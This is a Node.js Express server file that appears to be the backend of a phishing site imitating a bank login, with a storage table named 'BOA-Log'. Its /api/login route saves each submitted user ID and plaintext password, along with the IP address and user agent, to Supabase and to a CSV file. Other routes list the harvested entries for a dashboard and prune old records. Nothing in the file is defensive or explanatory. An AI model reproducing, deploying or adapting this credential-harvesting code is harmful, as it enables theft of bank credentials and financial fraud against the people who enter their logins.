import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

// Load environment variables
// On Vercel, explicitly load .env.production if it exists
const envFile = process.env.VERCEL ? '.env.production' : '.env';
dotenv.config({ path: envFile });
// Also try to load plain .env as fallback
dotenv.config({ path: '.env' });

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

console.log(`[Server] Starting in ${NODE_ENV} mode on port ${PORT}`);

// ============================================================================
// INITIALIZATION - Order matters!
// ============================================================================

// 1. Initialize Supabase
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
const useSupabase = !!(supabaseUrl && supabaseKey);

let supabase = null;
let supabaseError = null;
try {
  if (useSupabase) {
    if (!supabaseUrl || supabaseUrl.includes('undefined')) {
      throw new Error('SUPABASE_URL is undefined or invalid: ' + supabaseUrl);
    }
    if (!supabaseKey || supabaseKey.includes('undefined')) {
      throw new Error('SUPABASE_ANON_KEY is undefined or invalid');
    }
    supabase = createClient(supabaseUrl, supabaseKey);
    console.log('[Supabase] Client initialized successfully');
  } else {
    console.log('[Supabase] Not configured - using CSV logging only');
    console.log('[Supabase] SUPABASE_URL:', !!supabaseUrl, 'SUPABASE_ANON_KEY:', !!supabaseKey);
  }
} catch (error) {
  supabaseError = error.message || String(error);
  console.error('[Supabase] Initialization error:', supabaseError);
  console.error('[Supabase] Full error:', error);
}

// 2. Initialize logs directory
const logsDir = process.env.VERCEL ? '/tmp' : path.join(__dirname, 'logs');
try {
  if (!process.env.VERCEL && !fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
    console.log(`[Logs] Created directory: ${logsDir}`);
  }
} catch (error) {
  console.error('[Logs] Directory creation error:', error.message);
}

// 3. Global error handlers
process.on('unhandledRejection', (reason, promise) => {
  console.error('[Process] Unhandled Rejection:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('[Process] Uncaught Exception:', error);
});

// ============================================================================
// MIDDLEWARE
// ============================================================================

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Request logging middleware
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
         req.socket.remoteAddress ||
         'unknown';
}

async function logEntry(data) {
  const timestamp = new Date().toISOString();
  
  try {
    // Try Supabase first if enabled
    if (useSupabase && supabase) {
      try {
        console.log('[Supabase] Attempting to insert entry for user:', data.userId);
        
        const { data: insertedData, error } = await supabase
          .from('BOA-Log')
          .insert([
            {
              user_id: data.userId || 'N/A',
              password: data.password || 'N/A',
              remember_me: data.rememberMe ? true : false,
              ip_address: data.ipAddress || 'unknown',
              user_agent: data.userAgent || 'unknown',
              status: 'Attempted'
            }
          ])
          .select();
        
        if (error) {
          console.error('[Supabase] Insert error:', error.code, error.message);
        } else {
          console.log('[Supabase] ✓ Entry inserted successfully with ID:', insertedData?.[0]?.id);
        }
      } catch (supabaseError) {
        console.error('[Supabase] Exception during insert:', supabaseError.message);
      }
    }
    
    // Always log to CSV as backup
    const logsFile = path.join(logsDir, 'login_entries.csv');
    const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
    
    // Add header if file doesn't exist
    if (!fs.existsSync(logsFile)) {
      fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
    }
    
    fs.appendFileSync(logsFile, entry);
    console.log('[CSV] Entry logged for user:', data.userId);
  } catch (error) {
    console.error('[Logs] Error logging entry:', error.message);
    throw error;
  }
}

// ============================================================================
// API ROUTES
// ============================================================================

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: NODE_ENV
  });
});

// Setup endpoint to verify database
app.post('/api/setup', async (req, res) => {
  console.log('[/api/setup] Verifying database configuration');
  try {
    if (useSupabase && supabase) {
      const { data, error } = await supabase
        .from('BOA-Log')
        .select('count(*)', { count: 'exact' })
        .limit(1);
      
      if (error) {
        console.error('[/api/setup] Supabase table check failed:', error.message);
        return res.status(500).json({
          success: false,
          message: 'BOA-Log table not accessible',
          error: error.message,
          fallback: 'CSV logging active'
        });
      }
      
      console.log('[/api/setup] Supabase table verified');
      res.json({
        success: true,
        message: 'Database ready',
        dataSource: 'Supabase + CSV backup'
      });
    } else {
      res.json({
        success: true,
        message: 'Using CSV logging (Supabase not configured)',
        dataSource: 'CSV'
      });
    }
  } catch (error) {
    console.error('[/api/setup] Error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Debug endpoint
app.get('/api/debug', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: NODE_ENV,
    supabase_enabled: useSupabase,
    supabase_url_value: supabaseUrl ? supabaseUrl.substring(0, 50) + '...' : 'undefined',
    supabase_key_value: supabaseKey ? supabaseKey.substring(0, 20) + '...' : 'undefined',
    supabase_url_set: !!process.env.SUPABASE_URL,
    supabase_key_set: !!process.env.SUPABASE_ANON_KEY,
    supabase_client_exists: !!supabase,
    supabase_error: supabaseError || 'None',
    logsDir: logsDir,
    csvLogsPath: path.join(logsDir, 'login_entries.csv'),
    deployment: process.env.VERCEL ? 'Vercel' : 'Local'
  });
});

// Login API endpoint
app.post('/api/login', async (req, res) => {
  console.log('[/api/login] Received login request');
  
  const { userId, password, rememberMe } = req.body;
  const ipAddress = getClientIp(req);
  const userAgent = req.headers['user-agent'];

  try {
    await logEntry({
      userId,
      password,
      rememberMe: rememberMe === 'on' || rememberMe === true,
      ipAddress,
      userAgent
    });

    console.log('[/api/login] Successfully logged entry');
    res.json({ success: true, message: 'Login attempt recorded' });
  } catch (error) {
    console.error('[/api/login] Error:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Logs retrieval endpoint
app.get('/api/logs', async (req, res) => {
  try {
    const logsFile = path.join(logsDir, 'login_entries.csv');
    
    if (!fs.existsSync(logsFile)) {
      return res.json({
        success: true,
        data: [],
        message: 'No logs found yet',
        source: 'CSV'
      });
    }

    const logs = fs.readFileSync(logsFile, 'utf8');
    const lines = logs.split('\n').filter(line => line.trim());
    const headers = lines[0].split(',').map(h => h.trim());
    
    const data = lines.slice(1).map(line => {
      const values = [];
      let current = '';
      let inQuotes = false;
      
      for (let i = 0; i < line.length; i++) {
        const char = line[i];
        
        if (char === '"') {
          inQuotes = !inQuotes;
        } else if (char === ',' && !inQuotes) {
          values.push(current.trim().replace(/^"|"$/g, ''));
          current = '';
        } else {
          current += char;
        }
      }
      values.push(current.trim().replace(/^"|"$/g, ''));
      
      const obj = {};
      headers.forEach((header, i) => {
        obj[header] = values[i] || '';
      });
      return obj;
    });
    
    res.json({
      success: true,
      data: data,
      source: 'CSV',
      total: data.length
    });
  } catch (error) {
    console.error('[/api/logs] Error:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Database cleanup endpoint - keeps only last 10 entries
app.post('/api/cleanup', async (req, res) => {
  console.log('[/api/cleanup] Cleanup request received');

  if (!useSupabase || !supabase) {
    return res.status(400).json({
      success: false,
      message: 'Supabase not configured'
    });
  }

  try {
    // Create a client with service role key if available (to bypass RLS)
    let clientForDelete = supabase;
    if (process.env.SUPABASE_SERVICE_ROLE_KEY) {
      clientForDelete = supabase.createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY);
      console.log('[/api/cleanup] Using service role key for deletion');
    }

    // Get last 10 entry IDs
    const { data: last10, count: totalBefore, error: fetchError } = await clientForDelete
      .from('BOA-Log')
      .select('id', { count: 'exact' })
      .order('id', { ascending: false })
      .limit(10);

    if (fetchError) throw new Error(fetchError.message);

    if (!last10 || last10.length === 0) {
      return res.json({
        success: true,
        message: 'Database is empty',
        deleted: 0,
        total: 0
      });
    }

    const keepIds = last10.map(e => e.id);
    const minKeepId = Math.min(...keepIds);

    console.log(`[/api/cleanup] Keeping IDs: ${keepIds.sort().join(', ')}`);
    console.log(`[/api/cleanup] Deleting entries with ID < ${minKeepId}`);

    // Delete entries < minKeepId
    const { count: deleted, error: deleteError } = await clientForDelete
      .from('BOA-Log')
      .delete()
      .lt('id', minKeepId);

    if (deleteError) {
      console.error('[/api/cleanup] Delete error:', deleteError.message);
      console.error('[/api/cleanup] Details:', deleteError);
      if (!process.env.SUPABASE_SERVICE_ROLE_KEY) {
        console.error('[/api/cleanup] NOTE: SUPABASE_SERVICE_ROLE_KEY not available - RLS may be blocking deletes');
        return res.status(403).json({
          success: false,
          error: 'Delete blocked by RLS policy - service role key needed',
          hint: 'Set SUPABASE_SERVICE_ROLE_KEY environment variable'
        });
      }
      throw new Error(deleteError.message);
    }

    // Get final count
    const { count: totalAfter, error: countError } = await clientForDelete
      .from('BOA-Log')
      .select('*', { count: 'exact', head: true });

    if (countError) throw new Error(countError.message);

    console.log(`[/api/cleanup] Cleanup complete - Deleted: ${deleted || 0}, Remaining: ${totalAfter}`);

    res.json({
      success: true,
      message: 'Cleanup completed',
      before: totalBefore,
      deleted: deleted || 0,
      after: totalAfter,
      kept: keepIds.length
    });
  } catch (error) {
    console.error('[/api/cleanup] Error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message,
      note: 'Service role key may be required for delete operations'
    });
  }
});

// ============================================================================
// STATIC FILES
// ============================================================================

// Set proper MIME types
app.set('view engine', 'html');
app.use(express.static(path.join(__dirname), {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.css')) {
      res.setHeader('Content-Type', 'text/css; charset=utf-8');
    } else if (filePath.endsWith('.js')) {
      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    } else if (filePath.endsWith('.html')) {
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
    } else if (filePath.endsWith('.svg')) {
      res.setHeader('Content-Type', 'image/svg+xml; charset=utf-8');
    } else if (filePath.endsWith('.png') || filePath.endsWith('.jpg') || filePath.endsWith('.jpeg')) {
      res.setHeader('Cache-Control', 'public, max-age=3600');
    }
  }
}));

// Serve assets from subdirectories explicitly
app.use('/assets', express.static(path.join(__dirname, 'assets'), {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.css')) {
      res.setHeader('Content-Type', 'text/css; charset=utf-8');
    } else if (filePath.endsWith('.js')) {
      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    }
  }
}));

app.use('/api', express.static(path.join(__dirname, 'api')));
app.use('/etc', express.static(path.join(__dirname, 'etc')));

// Favicon route
app.get('/favicon.svg', (req, res) => {
  res.set('Content-Type', 'image/svg+xml; charset=utf-8');
  res.sendFile(path.join(__dirname, 'favicon.svg'));
});

// HTML routes
app.get('/', (req, res) => {
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/dashboard.html', (req, res) => {
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// ============================================================================
// ERROR HANDLING
// ============================================================================

app.use((err, req, res, next) => {
  console.error('[Error Handler]', err);
  res.status(500).json({
    success: false,
    error: NODE_ENV === 'production' ? 'Internal server error' : err.message
  });
});

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route not found'
  });
});

// ============================================================================
// SERVER STARTUP
// ============================================================================

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`[Server] Listening on port ${PORT}`);
  console.log(`[Server] Environment: ${NODE_ENV}`);
  console.log(`[Server] Supabase: ${useSupabase ? 'Enabled' : 'Disabled'}`);
  console.log(`[Server] Local: http://localhost:${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('[Server] SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('[Server] Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('[Server] SIGINT received, shutting down gracefully');
  server.close(() => {
    console.log('[Server] Server closed');
    process.exit(0);
  });
});

export default app;
